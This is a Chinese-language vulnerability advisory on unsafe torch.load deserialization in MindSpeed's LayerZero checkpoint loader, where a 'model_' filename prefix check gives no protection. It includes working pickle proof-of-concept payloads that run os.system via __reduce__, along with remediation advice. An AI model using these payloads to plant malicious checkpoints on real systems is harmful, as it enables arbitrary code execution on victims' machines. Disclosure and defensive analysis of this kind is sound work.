# VULN-SEC-LZ-003：LayerZero Checkpoint文件名前缀检查无效致torch.load RCE

## 漏洞概要

| 字段 | 值 |
|------|-----|
| **漏洞ID** | VULN-SEC-LZ-003 |
| **CWE** | CWE-502：不可信数据反序列化 |
| **CVE 参考** | CVE-2025-32434 (PyTorch torch.load) |
| **严重性** | High |
| **CVSS评分** | 7.8 (High) |
| **文件** | mindspeed/core/distributed/layerzero/state/scripts/layerzero_checkpointer.py |
| **行号** | 55, 110, 127, 135 |
| **函数** | LayerzeroCheckpoint 类（多个方法） |
| **危险点** | torch.load() 无 weights_only=True |

## 漏洞描述

`LayerzeroCheckpoint` 类使用 `torch.load()` 反序列化 checkpoint 文件时未设置 `weights_only=True` 参数。唯一的"缓解措施"是文件名前缀检查（"model_"），这**完全不提供安全性**。能写入 checkpoint 目录的攻击者可轻松绕过此检查，只需将恶意文件命名为 "model_" 前缀。

### 漏洞代码分析

**入口点** - 第 91-96 行：
```python
class LayerzeroCheckpoint(object):
    def __init__(self, ckpt_dir):
        self.ckpt_dir = ckpt_dir
        self.file_list = self._get_files_by_key(ckpt_dir, MODEL_FILE_KEY)  # MODEL_FILE_KEY = "model_"
        self.global_state = {}
        self._build_global_state()  # 漏洞点：从不可信来源加载文件
```

**不充分的缓解措施** - 第 141-147 行：
```python
def _get_files_by_key(self, ckpt_dir, key):
    file_list = []
    for root, _, files in os.walk(ckpt_dir):
        for file in files:
            if file.startswith(key):  # 仅检查文件名前缀！
                file_list.append(os.path.join(root, file))
    return file_list
```

**危险点 - 不安全反序列化** - 第 110 行：
```python
def _build_global_state(self):
    sd = torch.load(self.file_list[0], map_location=torch.device('cpu'))  # 无 weights_only=True！
```

**附加危险点** - 第 55 行（ShardStateDict 类）：
```python
def _init_metadata(self):
    state_dict = torch.load(self.filename, map_location='cpu')  # 无 weights_only=True！
```

## 攻击向量分析

### 攻击场景

1. **攻击者获得写入权限**到 checkpoint 目录（如被入侵的模型仓库、恶意内部人员、供应链攻击）
2. **攻击者创建恶意 checkpoint 文件**命名为 `model_exploit.pt`，包含嵌入的 pickle payload：
   ```python
   import torch
   import pickle
   
   class MaliciousPickle:
       def __reduce__(self):
           import os
           return (os.system, ('id > /tmp/pwned',))
   
   # 创建恶意 checkpoint
   malicious_data = {
       'iteration': 100,
       'args': type('Args', (), {'num_layers': 12, 'pipeline_model_parallel_size': 1})(),
       'parallel_state': {'tp_rank': 0, 'pp_rank': 0, 'global_rank': 0, 'tp_degree': 1, 'pp_degree': 1, 'dp_degree': 1},
       'shard_state_dict': {},
       'model': {}
   }
   torch.save(malicious_data, 'model_exploit.pt')
   ```
3. **运维人员运行转换工具**：
   ```bash
   python convert_to_megatron.py --input_folder ./checkpoints --output_folder ./output
   ```
4. **恶意代码在 `torch.load()` 反序列化文件时执行**

### 前缀检查为何失败

| 假设保护 | 实际情况 |
|----------|----------|
| 仅合法 checkpoint 文件通过过滤 | 任何以 "model_" 开头的文件都能通过 |
| 攻击者无法预测过滤 | 过滤极易满足：`model_evil.pt` |
| 提供安全边界 | 提供**零安全性** - 仅是命名约定 |

## 概念验证

```bash
# 攻击者进入 checkpoint 目录
cd /path/to/checkpoints/

# 创建恶意 checkpoint（通过 "model_" 前缀检查）
python3 << 'EOF'
import torch

class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('echo VULNERABLE > /tmp/pwned',))

payload = {
    'iteration': 0,
    'args': type('Args', (), {'num_layers': 1, 'pipeline_model_parallel_size': 1})(),
    'parallel_state': {'tp_rank': 0, 'pp_rank': 0, 'global_rank': 0, 
                        'tp_degree': 1, 'pp_degree': 1, 'dp_degree': 1},
    'shard_state_dict': {},
    'model': RCE()
}
torch.save(payload, 'model_malicious.pt')  # 通过前缀过滤！
EOF

# 当运维人员运行：
# python convert_to_megatron.py --input_folder /path/to/checkpoints --output_folder /output
# -> 代码执行发生
```

## 数据流

```
用户输入 (--input_folder)
        │
        ▼
┌─────────────────────────────────────────────────────────┐
│  LayerzeroCheckpoint.__init__(ckpt_dir)                 │
│  ├─ self._get_files_by_key(ckpt_dir, "model_")          │
│  │   └─ 匹配 "model_*" 的文件 → self.file_list          │
│  │      [无安全：攻击者控制文件名！]                      │
│  └─ self._build_global_state()                          │
│      └─ torch.load(self.file_list[0])                   │
│          └─ pickle.loads() → RCE                        │
└─────────────────────────────────────────────────────────┘
```

## 影响评估

| 影响 | 描述 |
|------|------|
| **机密性** | 完全 - 攻击者可读取进程可访问的任意文件 |
| **完整性** | 完全 - 攻击者可修改进程可访问的任意数据 |
| **可用性** | 完全 - 攻击者可崩溃进程或导致拒绝服务 |
| **范围** | 仅限于攻击者可写入 checkpoint 目录的上下文 |

### 攻击前提条件

1. checkpoint 目录写入权限（或能提供恶意 checkpoint 文件）
2. 受害者执行 `convert_to_megatron.py` 或以被入侵目录实例化 `LayerzeroCheckpoint`

### 常见攻击面

- 被入侵的模型仓库（HuggingFace、模型仓库）
- 有文件系统访问权限的恶意内部人员
- checkpoint 文件的供应链攻击
- 多租户环境的共享文件系统
- 处理外部 checkpoint 的 CI/CD 管道

## 相关漏洞

此文件包含多个类似漏洞：

| 行号 | 方法 | 问题 |
|------|------|------|
| 55 | `ShardStateDict._init_metadata` | 对 `self.filename` 的不安全 torch.load |
| 110 | `LayerzeroCheckpoint._build_global_state` | 对 `self.file_list[0]` 的不安全 torch.load |
| 127-128 | `LayerzeroCheckpoint.get_iteration` | 不安全 torch.load（引用未定义的 `self.mp_rank_files`） |
| 135-136 | `LayerzeroCheckpoint.get_args` | 不安全 torch.load（引用未定义的 `self.mp_rank_files`） |

参见：**VULN-SEC-LZ-002**（同文件中的 ShardStateDict._init_metadata）

## 修复建议

### 主要修复：使用 weights_only=True

```python
# 修复前（有漏洞）
sd = torch.load(self.file_list[0], map_location=torch.device('cpu'))

# 修复后（安全）
sd = torch.load(self.file_list[0], map_location=torch.device('cpu'), weights_only=True)
```

**注意**：这要求 checkpoint 文件仅包含张量数据。若 checkpoint 包含自定义对象，必须重构。

### 次要修复：添加文件验证

```python
import hashlib

def _validate_checkpoint_file(self, filepath: str, expected_hash: str = None) -> bool:
    """验证 checkpoint 文件完整性。"""
    if expected_hash:
        with open(filepath, 'rb') as f:
            file_hash = hashlib.sha256(f.read()).hexdigest()
        if file_hash != expected_hash:
            raise ValueError(f"{filepath} checksum 不匹配")
    return True

def _build_global_state(self):
    # 验证第一个文件
    self._validate_checkpoint_file(self.file_list[0])
    sd = torch.load(self.file_list[0], map_location=torch.device('cpu'), weights_only=True)
    # ... 方法其余部分
```

### 第三修复：使用 Safetensors 格式

```python
from safetensors.torch import load_file

# 用 safetensors 替换 torch.load（无 pickle，无代码执行）
sd = load_file(self.file_list[0])  # 安全反序列化
```

## 参考资料

- [CWE-502：不可信数据反序列化](https://cwe.mitre.org/data/definitions/502.html)
- [CVE-2025-32434：PyTorch torch.load 漏洞](https://nvd.nist.gov/vuln/detail/CVE-2025-32434)
- [PyTorch 安全公告：torch.load weights_only](https://pytorch.org/docs/stable/generated/torch.load.html)
- [项目 SECURITYNOTE.md](docs/zh/SECURITYNOTE.md) - 承认 CVE-2025-32434 风险
- [类似 VULN-SEC-LZ-002](scan-results/details/VULN-SEC-LZ-002.md) - 同文件，ShardStateDict 类

## 验证

验证此漏洞：

1. 创建恶意 checkpoint 文件：
   ```bash
   python3 -c "
   import torch
   class POC:
       def __reduce__(self):
           return (__import__('os').system, ('echo VULN-SEC-LZ-003_CONFIRMED',))
   torch.save({'model': POC()}, 'model_poc.pt')"
   ```

2. 运行转换工具：
   ```bash
   python -c "
   from mindspeed.core.distributed.layerzero.state.scripts.layerzero_checkpointer import LayerzeroCheckpoint
   LayerzeroCheckpoint('./')"
   ```

3. 若打印 "VULN-SEC-LZ-003_CONFIRMED"，漏洞确认。

---

**状态**：已确认漏洞  
**发现时间**：2024  
**最后更新**：2024